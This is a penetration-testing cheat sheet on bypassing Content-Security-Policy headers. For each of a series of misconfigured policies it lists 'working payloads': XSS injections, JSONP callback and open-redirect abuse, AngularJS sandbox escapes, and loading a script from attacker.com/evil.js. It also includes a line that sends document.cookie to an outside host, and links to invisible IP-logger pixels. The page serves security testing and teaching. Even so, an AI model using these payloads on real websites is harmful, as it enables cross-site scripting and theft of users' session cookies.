# CSP

## CSP Checker

https://csp-evaluator.withgoogle.com/

## Content-Security-Policy Header

Below are various Content-Security-Policy configurations with notes and working payloads demonstrating how they may be bypassed or abused. All links and payloads are preserved as in the original content.

{% stepper %}
{% step %}
### If upload from web is allowed or ![](https://pentestbook.six2dez.com/enumeration/URL)

* Links:
  * https://medium.com/@shahjerry33/pixel-that-steals-data-im-invisible-3c938d4c3888
  * https://iplogger.org/invisible/
  * https://iplogger.org/15bZ87
{% endstep %}

{% step %}
### Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://\*; child-src 'none'; report-uri /Report-parsing-url;

By observing this policy we can say it's damn vulnerable and will allow inline scripting as well. The reason behind that is the usage of `'unsafe-inline'` source as a value of `script-src` directive.

Working payload:

{% code title="payload.html" %}
```html
"/><script>alert(1337);</script>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://\*; child-src 'none'; report-uri /Report-parsing-url;

This is a misconfigured CSP policy due to usage of `unsafe-eval`.

Working payload:

{% code title="payload.html" %}
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data \*; child-src 'none'; report-uri /Report-parsing-url;

Misconfigured due to usage of a wildcard in `script-src`.

Working payloads:

{% code title="payload1.html" %}
```html
"/>'><script src=https://attacker.com/evil.js></script>
```
{% endcode %}

{% code title="payload2.html" %}
```html
"/>'><script src=data:text/javascript,alert(1337)></script>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: script-src 'self' report-uri /Report-parsing-url;

Misconfigured: `object-src` and `default-src` are missing.

Working payloads:

{% code title="payload1.html" %}
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```
{% endcode %}

{% code title="payload2.html" %}
```html
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' ajax.googleapis.com;

With `unsafe-eval` enabled we can perform a Client-Side Template Injection attack.

Working examples:

{% code title="example.html" %}
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} </div>
<script src=https://drive.google.com/uc?id=...&export=download></script>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: default-src 'self'; script-src 'self' \*.googleusercontent.com \*.google.com \*.yandex.net;

You can upload the payload to the Yandex.Disk storage, copy the download link and replace the `content_type` parameter value in the link with `application/javascript`.

Working payload:

{% code title="payload.html" %}
```html
<script src="https://[***].storage.yandex.net/[...]content_type=application/javascript&[***]"></script>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: default-src 'self'

If you are not allowed to connect to any external host, you can send data directly in the URL (query string) by redirecting the user to your web server.

Working payload:

{% code title="payload.js" %}
```javascript
window.location='https://deteact.com/'+document.cookie;
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: script-src 'self'; object-src 'none' ; report-uri /Report-parsing-url;

`object-src` is set to `none` but this CSP can be bypassed if the application allows users to upload any file type to the host. An attacker can upload a malicious script file and call it within a tag.

Working payload:

{% code title="payload.html" %}
```html
"/>'><script src="/user_upload/mypic.png.js"></script>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none' ; report-uri /Report-parsing-url;

When `script-src` allows `self` and a whitelisted domain like `www.google.com`, it can be bypassed using JSONP endpoints that allow insecure callbacks.

Working payload:

{% code title="payload.html" %}
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none' ; report-uri /Report-parsing-url;

If `script-src` allows `self` and a CDN domain, you can bypass CSP by loading a vulnerable version of a library hosted on that CDN.

Working payloads:

{% code title="payload1.html" %}
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
```
{% endcode %}

{% code title="payload2.html" %}
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
 <div ng-app ng-csp>
  {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
 </div>
```
{% endcode %}

{% code title="payload3.html" %}
```html
"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```
{% endcode %}

{% code title="payload4.html" %}
```html
"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;

If the application uses AngularJS and scripts are loaded from a whitelisted domain, it may be possible to bypass CSP by leveraging vulnerable AngularJS versions and callback functions.

Working payloads:

{% code title="payload1.html" %}
```html
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
```
{% endcode %}

{% code title="payload2.html" %}
```html
"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: script-src 'self' accounts.google.com/random/ website.with.redirect.com ; object-src 'none' ; report-uri /Report-parsing-url;

When multiple domains are whitelisted, an open redirect on one of them can be used to reach another whitelisted domain with a JSONP endpoint. The browser validates host but not necessarily the path parameters during redirection, enabling XSS.

Working payload:

{% code title="payload.html" %}
```html
">'><script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>">
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' www.googletagmanager.com;

With inline execution enabled via `'unsafe-inline'`, you can inject code into the page.

Working examples:

{% code title="payload1.html" %}
```html
url.com/asd.php/?a=<script>alert(document.domain)</scrtipt>
```
{% endcode %}

Notes:

* GoogleTagManager examples:

{% code title="gtm.html" %}
```html
<script>setTimeout(function(){dataLayer.push({event:'gtm.js'})},1000)</script>
<script src="//www.googletagmanager.com/gtm.js?id=GTM-*******"></script>
```
{% endcode %}
{% endstep %}

{% step %}
### Content-Security-Policy: default-src 'self' data: \*; connect-src 'self'; script-src 'self' ;report-uri /\_csp; upgrade-insecure-requests

This CSP can be bypassed using iframes if the application allows iframes from a whitelisted domain. Using the `srcdoc` attribute of an iframe, XSS can be achieved.

Working payloads:

{% code title="payload1.html" %}
```html
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
```
{% endcode %}

Sometimes it can be achieved using `defer` & `async` attributes of `script` within iframe (may fail due to SOP in many browsers):

{% code title="payload2.html" %}
```html
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```
{% endcode %}
{% endstep %}

{% step %}
### CSP with policy injection (only Chrome)

Example of policy injection via query:

```
/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```
{% endstep %}
{% endstepper %}

Was this helpful?
